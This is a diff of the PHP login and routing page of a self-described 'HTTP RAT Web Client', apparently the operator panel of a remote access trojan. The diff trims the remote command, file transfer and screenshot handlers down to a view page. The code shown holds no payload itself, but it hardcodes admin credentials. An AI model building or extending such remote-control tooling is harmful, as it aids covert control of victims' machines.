@@ -1,20 +1,12 @@
 <?php
-session_start();
-error_reporting(E_ALL ^ E_NOTICE);//显示除去 E_NOTICE 之外的所有错误信息
-
-echo "<!doctype html><html>";
-echo "<head>";
-echo '<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />';
-echo "<title>HTTP RAT Web Client</title>";
-echo "</head>";
-echo "<body>";
-echo '<header align="center"><strong>HTTP RAT Web Client v1.00</strong></header>';
+require('header.php');
 
 $adminname=$_POST["adminname"];
 $pass = $_POST["pass"];
-if(($adminname=="whitepig")&&($pass=="httprat!))")) 
+if(($adminname=="whitepig")&&($pass=="httprat")) 
 {
 	$_SESSION["admin"]="whitepig";
+	header("location:httprat.php");
 }
 
 if($_GET["do"]=="logout")
@@ -24,30 +16,25 @@ if($_GET["do"]=="logout")
 }
 
 if(isset($_SESSION["admin"]))
-{
-	require("menu.php");
-          
+{        
 	switch ($_GET["do"])
 	{
 		case "view": require_once("view.php");break;
-                case "cmd": require_once("cmd.php");break;
-                case "tran":require_once("tran.php");break;
-           
-		case "file": require_once("file.php");break;
-		case "snap": require_once("snap.php");break;
+		default:require('help.php');break;
 	}
 }
 else
 {
-	echo '<form action = "httprat.php" method="post">';
-	echo '<p align=center>username:<input type="text" name="adminname" /><br/>passwd:<input type="password" name="pass" />';
-	echo '<input type="submit" value="login"></p>';
+	echo 
+	'<form style="width:400px;margin:auto;" action = "httprat.php" method="post">
+	<input style="margin-bottom:10px;" class="form-control" type="text" name="adminname" />
+	<input style="margin-bottom:10px;" class="form-control" type="password" name="pass" />
+	<input class="btn btn-primary btn-block" type="submit" value="login">';
 }
 
 
 
-echo '</body>';
-echo '</html>';
+require('footer.php');
 
 
 
